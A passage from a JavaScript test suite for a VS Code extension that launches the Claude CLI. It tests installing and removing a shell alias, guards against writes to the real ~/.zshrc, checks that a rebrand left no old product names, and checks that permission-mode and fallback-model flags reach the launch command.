    const run = activate({ segments: ['{today}'], settings: { aliasName: 'cx' } });
    let panel;
    try {
        panel = await openDashboard();
        await withHome(async ({ home, rc }) => {
            const mine = '# mine\nalias theirs=\'ls\'\n';
            fs.writeFileSync(rc, mine);
            ext.installAlias({ settings: { aliasName: 'cx', model: 'opus' }, home, shell: '/bin/zsh' });
            assert.match(fs.readFileSync(rc, 'utf8'), /alias cx=/);

            ext.removeAlias({ home, shell: '/bin/zsh' });
            assert.equal(fs.readFileSync(rc, 'utf8'), mine, 'the command left the block, or took more than it');
        });
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// The button still works after all that: a message with choices on it reaches
// the writer. Driven with a shell nothing can be written for, because the real
// home is the only destination a message-driven write has — and a test that
// exercises it writes into the file this machine actually uses. That happened
// once here; the assertion is now that the message arrives, not that it lands.
test('a message with choices reaches the writer, which takes its own shell', async () => {
    const run = activate({ segments: ['{today}'] });
    let panel;
    const rc = path.join(os.homedir(), '.zshrc');
    const before = fs.existsSync(rc) ? fs.readFileSync(rc, 'utf8') : null;
    // The backup is asserted against its own state before this run, not against
    // absence: **Write to ~/.zshrc** leaves exactly this file beside the real
    // one, so a machine where the feature has been used has it already and an
    // absence check fails there for the right feature working correctly.
    const bak = `${rc}.claude-dashboard.bak`;
    const bakBefore = fs.existsSync(bak) ? fs.readFileSync(bak, 'utf8') : null;
    try {
        panel = await openDashboard();
        await panel.__receive({
            type: 'installAlias',
            // No name: the message path has only the real home to write into, so
            // this is driven up to the point of writing and no further. What it
            // does with a name is covered by the calls with a scratch home.
            settings: { model: 'opus' },
            home: '/nowhere-at-all', shell: '/usr/local/bin/fish',
        });
        assert.ok(!vscode.__warnings.some((w) => /does not take an alias/.test(w)),
            'the shell named in the message was used instead of the process one');
        // Belt and braces, because this test once wrote into the real file: it
        // is byte for byte what it was, and no backup was left beside it.
        if (before !== null) assert.equal(fs.readFileSync(rc, 'utf8'), before);
        if (bakBefore === null) assert.ok(!fs.existsSync(bak), 'a backup was left behind');
        else assert.equal(fs.readFileSync(bak, 'utf8'), bakBefore, 'the backup was rewritten');
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// The rebrand renamed what a user reads and left the extension id alone,
// and every `claudeStatusline.*` setting key alone. A half-applied rename is the
// failure to catch: one forgotten title and the old product name sits in the
// command palette next to the new one.
test('no user-facing string still carries the old product name', () => {
    const pkg = require('../package.json');
    const strings = [
        pkg.displayName,
        pkg.description,
        pkg.contributes.configuration.title,
        ...pkg.contributes.commands.map((c) => c.title),
        ...Object.values(pkg.contributes.viewsContainers).flat().map((v) => v.title),
        ...Object.values(pkg.contributes.configuration.properties).map((p) => p.markdownDescription || p.description || ''),
    ];
    for (const s of strings) {
        assert.ok(!/Claude Dashboard|Claude Statusline|Claude dashnlines/.test(s),
            `old name in: ${String(s).slice(0, 70)}`);
    }
});

test('the identifier and the setting keys are untouched by the rebrand', () => {
    const pkg = require('../package.json');
    // Renaming these would orphan globalStorage and reset everyone's settings;
    // the rebrand deliberately stops at what is read rather than what is keyed.
    assert.equal(pkg.name, 'claude-dashboard');
    assert.equal(pkg.publisher, 'grgrwlkr');
    for (const key of Object.keys(pkg.contributes.configuration.properties)) {
        assert.ok(key.startsWith('claudeStatusline.'), `${key} left the claudeStatusline namespace`);
    }
    for (const c of pkg.contributes.commands) {
        assert.ok(c.command.startsWith('claudeStatusline.'), `${c.command} left the claudeStatusline namespace`);
    }
});

// The two new choices travel like the others: read from the settings, written
// by the page, and quoted onto the line the button runs.
test('the button passes the permission mode and the fallback chain as flags', async () => {
    const run = activate({ segments: ['{today}'], settings: { model: 'opus', permissionMode: 'plan', fallbackModel: 'sonnet' } });
    try {
        await openClaude();
        assert.equal(ranIn(lastTerminal()), "claude --model 'opus' --permission-mode 'plan' --fallback-model 'sonnet'");
    } finally { run.dispose(); }
});

test('the manifest offers the permission modes and fallback chains the page does', () => {
    const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8'));
    const props = manifest.contributes.configuration.properties;
    for (const [key, list] of [['permissionMode', db.PERMISSION_MODES], ['fallbackModel', db.FALLBACKS]]) {
        const property = props[`claudeStatusline.${key}`];
        assert.ok(property, `${key} is a setting`);
        assert.deepEqual(property.enum, list.map(([value]) => value));
        assert.equal(property.enum.length, property.enumDescriptions.length);
        assert.equal(property.default, '');
    }
});
